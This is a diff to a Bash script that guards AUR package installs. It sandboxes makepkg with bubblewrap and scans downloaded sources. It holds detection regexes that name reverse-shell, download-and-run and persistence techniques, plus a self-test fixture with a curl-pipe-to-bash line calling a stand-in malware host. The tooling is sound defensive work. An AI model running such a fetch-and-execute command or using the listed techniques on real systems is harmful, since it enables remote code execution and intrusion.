@@ -142,6 +142,13 @@ _AUR_GUARD_FALLBACK_BAD_PACKAGES=(
 _AUR_GUARD_HARD_BLOCK_RE='atomic-lockfile|lockfile-js|js-digest|digest-js|src/hooks/deps|/api/agent|hidden_pids|hidden_names|hidden_inodes|curl[[:space:]][^|;]*\|[[:space:]]*(sh|bash)|wget[[:space:]][^|;]*\|[[:space:]]*(sh|bash)|base64[[:space:]]+(-d|--decode)|/dev/tcp|/dev/udp'
 _AUR_GUARD_HOOK_BLOCK_RE='npm[[:space:]]+(install|i|add)|bun[[:space:]]+(install|add|i)|pnpm[[:space:]]+(install|add|i)|yarn[[:space:]]+(install|add)'
 _AUR_GUARD_PACKAGE_JSON_BLOCK_RE='"(preinstall|postinstall)"[[:space:]]*:'
+_AUR_GUARD_SOURCE_HARD_BLOCK_RE="${_AUR_GUARD_HARD_BLOCK_RE}|\$\([[:space:]]*(curl|wget)[^)]*\)|<\([[:space:]]*(curl|wget)[^)]*\)|(^|[;&|[:space:]])(nc|ncat)[[:space:]][^#]*[[:space:]]-e[[:space:]]|socat[[:space:]].*(EXEC|SYSTEM):|mkfifo[[:space:]].*(nc|ncat)|LD_PRELOAD=.*(/tmp|/dev/shm)|/etc/ld\.so\.preload|\.ssh/authorized_keys|\.config/autostart|systemd/user/|(^|[;&|[:space:]])crontab([[:space:]]|$)"
+_AUR_GUARD_SOURCE_DOWNLOAD_RE='(^|[;&|[:space:]])(curl|wget|fetch|aria2c)[[:space:]]'
+_AUR_GUARD_SOURCE_EXEC_RE='chmod[[:space:]][^#]*\+x|(^|[;&|[:space:]])(bash|sh|zsh|fish|python3?|perl|ruby|node)[[:space:]][^#]*(/tmp|/dev/shm)|(^|[;&|[:space:]])(eval|source)[[:space:]]|(^|[;&|[:space:]])\.[[:space:]]+[^[:space:]]|(^|[;&|[:space:]])(sudo|pkexec)[[:space:]]'
+_AUR_GUARD_SOURCE_SCAN_MAX_BYTES=$((8 * 1024 * 1024))
+_AUR_GUARD_SOURCE_SCAN_MAX_FILES=15000
+_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS=900
+_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS=10
 
 _aur_guard_pass() {
   local msg="$1"
@@ -482,6 +489,231 @@ _aur_guard_rpc_providers() {
   return "$status"
 }
 
+_aur_guard_prepare_public_keyring() {
+  local pkgdir="$1"
+  local gnupg_dir="$pkgdir/.awtarchy-gnupg"
+  local exported_keys="$pkgdir/.awtarchy-public-keys.gpg"
+
+  rm -rf "$gnupg_dir"
+  install -d -m 0700 "$gnupg_dir" || return 1
+
+  if command gpg --batch --export > "$exported_keys" 2>/dev/null \
+      && [[ -s "$exported_keys" ]]; then
+    if ! GNUPGHOME="$gnupg_dir" command gpg --batch --quiet \
+        --import "$exported_keys" >/dev/null 2>&1; then
+      rm -f "$exported_keys"
+      _aur_guard_fail 'could not create an isolated public-key ring for source verification'
+      return 1
+    fi
+  fi
+
+  rm -f "$exported_keys"
+}
+
+_aur_guard_makepkg_sandbox() {
+  local pkgdir="$1"
+  local network="$2"
+  local access="$3"
+  local username hidden
+  local -a bwrap_args
+
+  shift 3
+  username="${USER:-$(id -un)}"
+
+  mkdir -p \
+    "$pkgdir/.awtarchy-gnupg" \
+    "$pkgdir/.awtarchy-build" \
+    "$pkgdir/.awtarchy-pkg" \
+    "$pkgdir/.awtarchy-srcpkg" \
+    "$pkgdir/.awtarchy-log" \
+    "$pkgdir/.awtarchy-cache" || return 1
+
+  bwrap_args=(
+    --die-with-parent
+    --new-session
+    --unshare-all
+    --cap-drop ALL
+  )
+
+  case "$network" in
+    allow)
+      bwrap_args+=(--share-net)
+      ;;
+    deny)
+      ;;
+    *)
+      _aur_guard_fail "invalid sandbox network mode: $network"
+      return 2
+      ;;
+  esac
+
+  bwrap_args+=(
+    --ro-bind / /
+    --dev /dev
+    --proc /proc
+    --tmpfs /tmp
+  )
+
+  for hidden in /home /root /mnt /media /run/user /run/dbus /run/media /var/tmp; do
+    [[ -d "$hidden" ]] && bwrap_args+=(--tmpfs "$hidden")
+  done
+
+  bwrap_args+=(--dir /work)
+
+  case "$access" in
+    readonly)
+      bwrap_args+=(--ro-bind "$pkgdir" /work)
+      ;;
+    writable)
+      bwrap_args+=(--bind "$pkgdir" /work)
+      if [[ -d "$pkgdir/.git" ]]; then
+        bwrap_args+=(--ro-bind "$pkgdir/.git" /work/.git)
+      fi
+      ;;
+    *)
+      _aur_guard_fail "invalid sandbox filesystem mode: $access"
+      return 2
+      ;;
+  esac
+
+  bwrap_args+=(
+    --dir /tmp/awtarchy-home
+    --clearenv
+    --setenv HOME /tmp/awtarchy-home
+    --setenv USER "$username"
+    --setenv LOGNAME "$username"
+    --setenv SHELL /bin/bash
+    --setenv PATH /usr/local/sbin:/usr/local/bin:/usr/bin
+    --setenv LANG C.UTF-8
+    --setenv LC_ALL C.UTF-8
+    --setenv TMPDIR /tmp
+    --setenv GNUPGHOME /work/.awtarchy-gnupg
+    --setenv XDG_CACHE_HOME /work/.awtarchy-cache
+    --setenv SRCDEST /work
+    --setenv BUILDDIR /work/.awtarchy-build
+    --setenv PKGDEST /work/.awtarchy-pkg
+    --setenv SRCPKGDEST /work/.awtarchy-srcpkg
+    --setenv LOGDEST /work/.awtarchy-log
+    --chdir /work
+    /usr/bin/makepkg
+    "$@"
+  )
+
+  command timeout \
+    --foreground \
+    --kill-after="${_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS}s" \
+    "${_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS}s" \
+    bwrap "${bwrap_args[@]}"
+}
+
+_aur_guard_assert_tracked_files_unchanged() {
+  local pkg="$1"
+  local pkgdir="$2"
+
+  if ! command git -C "$pkgdir" diff --quiet -- . \
+      || ! command git -C "$pkgdir" diff --cached --quiet -- .; then
+    command git -C "$pkgdir" diff -- . >&2 || true
+    _aur_guard_fail "$pkg modified tracked AUR files while makepkg metadata or sources were being inspected"
+    return 1
+  fi
+}
+
+_aur_guard_source_candidate() {
+  local file="$1"
+  local relative="$2"
+  local name="${relative##*/}"
+
+  case "$name" in
+    PKGBUILD|*.sh|*.bash|*.zsh|*.fish|*.py|*.pyw|*.pl|*.rb|*.js|*.mjs|*.cjs|*.ts|*.lua|*.tcl|*.awk|*.inc|*.env|*.conf|*.cfg|*.rc|*.profile|*.mk|*.in|*.patch|*.diff|*.service|*.timer|*.socket|*.path|*.desktop|*.hook|*.install|*.cmake|CMakeLists.txt|meson.build|meson_options.txt|Makefile|GNUmakefile|makefile|configure|configure.ac|bootstrap|install|setup|build|run|package.json|pyproject.toml|build.rs)
+      return 0
+      ;;
+  esac
+
+  [[ -x "$file" ]] && return 0
+  [[ $(head -c 2 "$file" 2>/dev/null) == '#!' ]]
+}
+
+_aur_guard_scan_source_tree() {
+  local pkg="$1"
+  local root="$2"
+  local mode="${3:-recursive}"
+  local file relative size
+  local scanned=0
+  local network_reference_files=0
+  local matched=false
+  local -a find_args
+
+  [[ -d "$root" ]] || return 0
+
+  find_args=("$root")
+  if [[ "$mode" == 'top' ]]; then
+    find_args+=(-maxdepth 1)
+  fi
+  find_args+=(
+    -type f
+    ! -path '*/.git/*'
+    ! -path '*/.awtarchy-gnupg/*'
+    ! -path '*/.awtarchy-cache/*'
+    ! -path '*/.awtarchy-pkg/*'
+    ! -path '*/.awtarchy-srcpkg/*'
+    ! -path '*/.awtarchy-log/*'
+    -print0
+  )
+
+  while IFS= read -r -d '' file; do
+    relative="${file#"$root"/}"
+    _aur_guard_source_candidate "$file" "$relative" || continue
+
+    ((scanned += 1))
+    if (( scanned > _AUR_GUARD_SOURCE_SCAN_MAX_FILES )); then
+      _aur_guard_fail "$pkg contains more than $_AUR_GUARD_SOURCE_SCAN_MAX_FILES script or build files; refusing an incomplete source scan"
+      return 1
+    fi
+
+    size=$(stat -c %s "$file" 2>/dev/null) || {
+      _aur_guard_fail "could not determine source-file size: $relative"
+      return 1
+    }
+
+    if (( size > _AUR_GUARD_SOURCE_SCAN_MAX_BYTES )); then
+      _aur_guard_fail "$pkg contains a script-like source file larger than the scan limit: $relative"
+      return 1
+    fi
+
+    /usr/bin/grep -Iq . "$file" || continue
+
+    if /usr/bin/grep -Eq 'https?://|git(\+https)?://|ssh://' "$file"; then
+      ((network_reference_files += 1))
+    fi
+
+    if /usr/bin/grep -HnEi "$_AUR_GUARD_SOURCE_HARD_BLOCK_RE" "$file"; then
+      matched=true
+    fi
+
+    if /usr/bin/grep -Eq "$_AUR_GUARD_SOURCE_DOWNLOAD_RE" "$file" \
+        && /usr/bin/grep -Eq "$_AUR_GUARD_SOURCE_EXEC_RE" "$file"; then
+      printf '%s: contains both network-download and execution/persistence behavior\n' \
+        "$file"
+      matched=true
+    fi
+
+    if [[ ${relative##*/} == 'package.json' ]] \
+        && /usr/bin/grep -HnE "$_AUR_GUARD_PACKAGE_JSON_BLOCK_RE" "$file"; then
+      matched=true
+    fi
+  done < <(find "${find_args[@]}")
+
+  if $matched; then
+    _aur_guard_fail "known malicious or unsafe execution pattern found in downloaded source code for $pkg"
+    return 1
+  fi
+
+  printf 'AUR Verify: scanned %d script/build files for %s.\n' \
+    "$scanned" "$pkg"
+  printf 'AUR Verify: %d scanned files referenced network URLs; those URLs were not crawled.\n' \
+    "$network_reference_files"
+}
+
 _aur_guard_scan_package_files() {
   local pkg="$1"
   local pkgdir="$2"
@@ -524,6 +756,8 @@ _aur_guard_scan_package_files() {
     --include='*.install' \
     '^[[:space:]]*install=|post_install|post_upgrade|pre_install|pre_upgrade|setcap|chmod[[:space:]].*[+u]s|systemctl' \
     "$pkgdir" || true
+
+  _aur_guard_scan_source_tree "$pkg" "$pkgdir" recursive
 }
 
 _aur_guard_verify_srcinfo() {
@@ -536,11 +770,17 @@ _aur_guard_verify_srcinfo() {
     return 1
   }
 
-  if ! (cd "$pkgdir" && command makepkg --printsrcinfo) > "$generated"; then
+  if ! _aur_guard_makepkg_sandbox "$pkgdir" deny readonly \
+      --printsrcinfo > "$generated"; then
     rm -f "$generated"
-    _aur_guard_fail "could not regenerate .SRCINFO for $pkg"
+    _aur_guard_fail "could not regenerate .SRCINFO for $pkg inside the sandbox"
     return 1
   fi
+
+  _aur_guard_assert_tracked_files_unchanged "$pkg" "$pkgdir" || {
+    rm -f "$generated"
+    return 1
+  }
 
   if ! diff -u "$pkgdir/.SRCINFO" "$generated"; then
     rm -f "$generated"
@@ -640,13 +880,56 @@ _aur_guard_verify_package_recursive() {
     fi
   done < <(awk -F ' = ' '/^[[:space:]]*pkgname = / {print $2}' "$srcinfo")
 
-  printf 'AUR Verify: verifying downloaded sources for %s.\n' "$pkgbase"
-  if ! (cd "$pkgdir" && command makepkg --verifysource); then
+  _aur_guard_prepare_public_keyring "$pkgdir" || {
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
+
+  printf 'AUR Verify: verifying downloaded sources for %s inside bubblewrap.\n' "$pkgbase"
+  if ! _aur_guard_makepkg_sandbox "$pkgdir" allow writable \
+      --verifysource --noconfirm --nocolor; then
     _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
     _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
     _aur_guard_fail "source checksum or PGP verification failed for $pkgbase"
     return 1
   fi
+
+  _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
+
+  _aur_guard_scan_source_tree "$pkgbase" "$pkgdir" top || {
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
+
+  rm -rf "$pkgdir/.awtarchy-build"
+  mkdir -p "$pkgdir/.awtarchy-build" || return 1
+
+  printf 'AUR Verify: extracting verified sources for %s inside an offline sandbox.\n' "$pkgbase"
+  if ! _aur_guard_makepkg_sandbox "$pkgdir" deny writable \
+      --nobuild --noprepare --noverify --nodeps --holdver --noconfirm --nocolor; then
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    _aur_guard_fail "could not safely extract verified sources for $pkgbase"
+    return 1
+  fi
+
+  _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
+
+  _aur_guard_scan_source_tree "$pkgbase" "$pkgdir/.awtarchy-build" recursive || {
+    _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
+    _AUR_GUARD_REQUEST_STATE[$pkg]='failed'
+    return 1
+  }
 
   commit=$(git -C "$pkgdir" rev-parse HEAD 2>/dev/null) || {
     _AUR_GUARD_BASE_STATE[$pkgbase]='failed'
@@ -760,6 +1043,21 @@ _aur_guard_verify_tree() {
     return 127
   }
 
+  type -P bwrap >/dev/null 2>&1 || {
+    _aur_guard_fail 'bubblewrap is required. Install it with: sudo pacman -S bubblewrap'
+    return 127
+  }
+
+  type -P timeout >/dev/null 2>&1 || {
+    _aur_guard_fail 'timeout from coreutils is required'
+    return 127
+  }
+
+  type -P gpg >/dev/null 2>&1 || {
+    _aur_guard_fail 'gpg is required for isolated PGP source verification'
+    return 127
+  }
+
   type -P jq >/dev/null 2>&1 || {
     _aur_guard_fail 'jq is required for safe AUR virtual dependency resolution'
     return 127
@@ -801,7 +1099,7 @@ _aur_guard_cleanup_work() {
 }
 
 aurguardtest() (
-  local test_root test_bin helper_log
+  local test_root test_bin helper_log network_log
   local aurup_output wrapper_output aurup_status
   local tool
 
@@ -810,11 +1108,18 @@ aurguardtest() (
 
   test_bin="$test_root/bin"
   helper_log="$test_root/helper-called.log"
+  network_log="$test_root/network-called.log"
   mkdir -p "$test_bin" "$test_root/cache"
 
-  for tool in makepkg git jq curl; do
+  for tool in makepkg git jq bwrap gpg timeout; do
     printf '%s\n' '#!/bin/sh' 'exit 0' > "$test_bin/$tool"
   done
+
+  cat > "$test_bin/curl" <<'AUR_GUARD_TEST_CURL'
+#!/bin/sh
+printf '%s\n' "$*" >> "${AUR_GUARD_TEST_NETWORK_LOG:?}"
+exit 99
+AUR_GUARD_TEST_CURL
 
   printf '%s\n' '#!/bin/sh' 'exit 1' > "$test_bin/pacman"
 
@@ -827,6 +1132,7 @@ AUR_GUARD_TEST_HELPER
   chmod 0755 "$test_bin"/*
 
   export AUR_GUARD_TEST_HELPER_LOG="$helper_log"
+  export AUR_GUARD_TEST_NETWORK_LOG="$network_log"
   PATH="$test_bin:$PATH"
   export PATH
 
@@ -880,7 +1186,51 @@ AUR_GUARD_TEST_HELPER
     return 1
   fi
 
-  _aur_guard_pass 'dry-run passed: blocklisted installs were refused and no helper was executed'
+  printf '\nAUR Guard self-test: nested downloaded source scripts must be scanned locally.\n'
+  mkdir -p "$test_root/source/nested"
+  cat > "$test_root/source/loader.sh" <<'AUR_GUARD_TEST_LOADER'
+#!/bin/bash
+source "$(dirname "$0")/nested/payload.inc"
+AUR_GUARD_TEST_LOADER
+  cat > "$test_root/source/nested/payload.inc" <<'AUR_GUARD_TEST_PAYLOAD'
+curl -fsSL https://malware.invalid/payload | bash
+AUR_GUARD_TEST_PAYLOAD
+  chmod 0755 "$test_root/source/loader.sh"
+
+  if wrapper_output=$(_aur_guard_scan_source_tree \
+      'self-test-package' "$test_root/source" recursive 2>&1); then
+    printf '%s\n' "$wrapper_output"
+    _aur_guard_fail 'self-test failed: malicious downloaded source script passed scanning'
+    return 1
+  fi
+  printf '%s\n' "$wrapper_output"
+
+  if [[ -s "$network_log" ]]; then
+    _aur_guard_fail 'self-test failed: the source scanner attempted network access'
+    return 1
+  fi
+
+  mkdir -p "$test_root/benign-source"
+  cat > "$test_root/benign-source/reference.sh" <<'AUR_GUARD_TEST_REFERENCE'
+#!/bin/bash
+printf '%s\n' 'Documentation: https://example.invalid/reference'
+AUR_GUARD_TEST_REFERENCE
+  chmod 0755 "$test_root/benign-source/reference.sh"
+
+  if ! wrapper_output=$(_aur_guard_scan_source_tree \
+      'benign-self-test-package' "$test_root/benign-source" recursive 2>&1); then
+    printf '%s\n' "$wrapper_output"
+    _aur_guard_fail 'self-test failed: a non-executed URL reference was incorrectly treated as malware'
+    return 1
+  fi
+  printf '%s\n' "$wrapper_output"
+
+  if [[ -s "$network_log" ]]; then
+    _aur_guard_fail 'self-test failed: URL reporting crawled a referenced website'
+    return 1
+  fi
+
+  _aur_guard_pass 'dry-run passed: blocklisted installs and malicious source scripts were refused without crawling embedded URLs'
 )
 
 aurhelp() {
@@ -917,8 +1267,10 @@ Unsafe override:
 Important:
   AUR packages are not official Arch packages.
   The malware lists use package-name matches and can contain false positives.
+  PKGBUILD metadata, source downloads, and source extraction run inside bubblewrap.
+  Downloaded script/build files are scanned before installation is allowed.
   Source verification proves sources match the PKGBUILD declarations.
-  It does not prove that upstream source code is harmless.
+  Pattern scanning still cannot prove that upstream source code is harmless.
 AUR_GUARD_HELP
 }
 
